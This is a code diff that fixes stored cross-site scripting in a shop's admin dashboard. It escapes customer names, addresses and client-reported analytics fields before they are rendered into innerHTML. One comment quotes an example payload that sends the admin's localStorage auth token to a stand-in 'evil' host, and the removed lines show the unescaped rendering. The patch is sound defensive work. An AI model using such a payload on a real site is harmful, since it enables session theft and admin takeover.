@@ -4463,7 +4463,13 @@ function renderDashboardData(orders, prods, stats) {
 
   // Activity feed — most recent within range
   const activities = [...rangeOrders].sort((a,b)=>new Date(b.created_at)-new Date(a.created_at)).slice(0,10).map(o=>({
-    text:`<strong>${o.customer_name||'Customer'}</strong> placed order <span style="color:var(--green-text)">₹${fmtNum(o.total||0)}</span>`,
+    // esc(): customer_name is typed at checkout and rendered into the
+    // dashboard's innerHTML. Unescaped, a name like
+    // <img src=x onerror="fetch('//evil/'+localStorage.authToken)">
+    // runs in the ADMIN's session the moment they open the dashboard —
+    // stored XSS that escalates from any customer to admin. Every
+    // customer-supplied field on this screen has to go through esc().
+    text:`<strong>${esc(o.customer_name||'Customer')}</strong> placed order <span style="color:var(--green-text)">₹${fmtNum(o.total||0)}</span>`,
     time: fmtTime(o.created_at),
     color: isPaid(o)?'var(--green)':'var(--gold)'
   }));
@@ -4507,7 +4513,7 @@ function renderDashboardData(orders, prods, stats) {
   document.getElementById('dashOrdersTbody').innerHTML = [...rangeOrders].sort((a,b)=>new Date(b.created_at)-new Date(a.created_at)).slice(0,10).map(o=>`
     <tr>
       <td class="td-id" style="color:var(--green-text);cursor:pointer" onclick="showPage('orders')">${o.id}</td>
-      <td><div style="font-size:0.83rem;font-weight:500;">${esc(o.customer_name)||'-'}</div><div style="font-size:0.7rem;color:var(--text3);">${o.city||o.customer_phone||''}</div></td>
+      <td><div style="font-size:0.83rem;font-weight:500;">${esc(o.customer_name)||'-'}</div><div style="font-size:0.7rem;color:var(--text3);">${esc(o.city||o.customer_phone||'')}</div></td>
       <td style="color:var(--green-text);font-weight:600;">₹${fmtNum(o.total||0)}</td>
       <td>${payBadge(o.payment_status)}</td>
       <td>${statusBadge(o.fulfillment||o.status)}</td>
@@ -5285,11 +5291,18 @@ async function updateLiveVisitors() {
       if (tbody) {
         tbody.innerHTML = sessions.length > 0
           ? sessions.map(s => `<tr>
-              <td style="font-size:0.8rem;font-family:var(--mono)">${s.page||'/'}</td>
-              <td><span style="font-size:0.78rem;">🇮🇳 ${s.city||'India'}</span></td>
-              <td>${s.device||'–'}</td>
+              <!-- esc(): s.page is whatever path the visitor's browser
+                   reported in the analytics ping — an UNAUTHENTICATED,
+                   fully client-controlled endpoint. Stored unescaped and
+                   rendered here into the admin's innerHTML, a page value
+                   of <img src=x onerror=...> is stored XSS in the admin
+                   session, needing nothing but a crafted ping. city and
+                   device ride the same request. -->
+              <td style="font-size:0.8rem;font-family:var(--mono)">${esc(s.page||'/')}</td>
+              <td><span style="font-size:0.78rem;">🇮🇳 ${esc(s.city||'India')}</span></td>
+              <td>${esc(s.device||'–')}</td>
               <td style="font-family:var(--mono);font-size:0.75rem">${Math.floor((s.duration||0)/60)}:${String((s.duration||0)%60).padStart(2,'0')}</td>
-              <td><span class="badge badge-gray">${s.source||'Direct'}</span></td>
+              <td><span class="badge badge-gray">${esc(s.source||'Direct')}</span></td>
               <td><span class="badge badge-green">Active</span></td>
             </tr>`).join('')
           : '<tr><td colspan="6" style="text-align:center;color:var(--text3);padding:20px;font-size:0.82rem;">No active sessions right now</td></tr>';
@@ -5375,11 +5388,11 @@ async function _fetchGA4Realtime() {
       const tbody = document.getElementById('liveSessionsTbody');
       if (tbody && d.sessions.length > 0) {
         tbody.innerHTML = d.sessions.map(s => `<tr>
-          <td style="font-family:var(--mono);font-size:0.8rem">${s.page||'/'}</td>
-          <td>🌍 ${s.country||'India'}</td>
-          <td>${s.device||'–'}</td>
+          <td style="font-family:var(--mono);font-size:0.8rem">${esc(s.page||'/')}</td>
+          <td>🌍 ${esc(s.country||'India')}</td>
+          <td>${esc(s.device||'–')}</td>
           <td>–</td>
-          <td>${s.source||'organic'}</td>
+          <td>${esc(s.source||'organic')}</td>
           <td><span class="badge badge-blue">GA4</span></td>
         </tr>`).join('');
       }
@@ -7382,9 +7395,9 @@ function printInvoice(orderId) {
         <div style="font-size:10px;text-transform:uppercase;letter-spacing:.8px;color:#888;margin-bottom:4px;font-weight:700;">Bill To</div>
         <div style="font-weight:700;font-size:14px;">${esc(o.customer_name||'Customer')}</div>
         <div style="font-size:11px;color:#555;line-height:1.8;margin-top:2px;">
-          ${o.address||o.address_line1||''} ${o.address_line2||''}<br>
-          ${o.city||''}, ${o.state||''} – ${o.pincode||''}<br>
-          📞 ${o.customer_phone||''}<br>✉️ ${o.customer_email||''}
+          ${esc(o.address||o.address_line1||'')} ${esc(o.address_line2||'')}<br>
+          ${esc(o.city||'')}, ${esc(o.state||'')} – ${esc(o.pincode||'')}<br>
+          📞 ${esc(o.customer_phone||'')}<br>✉️ ${esc(o.customer_email||'')}
         </div>
       </div>
       <div>
@@ -9343,7 +9356,10 @@ updateLiveVisitors = async function () {
 
   if (sessions.length) {
     const s0 = sessions[0];
-    _lvAddStream(`${s0.city || 'India'} · ${s0.device || ''} · ${s0.page || '/'} · via ${s0.source || 'Direct'}`);
+    // _lvAddStream drops its argument straight into innerHTML, so every
+    // field must be escaped here — page/city/device/source all come from
+    // the client-controlled analytics ping.
+    _lvAddStream(`${esc(s0.city || 'India')} · ${esc(s0.device || '')} · ${esc(s0.page || '/')} · via ${esc(s0.source || 'Direct')}`);
   }
   _lvPageDist(sessions);
 
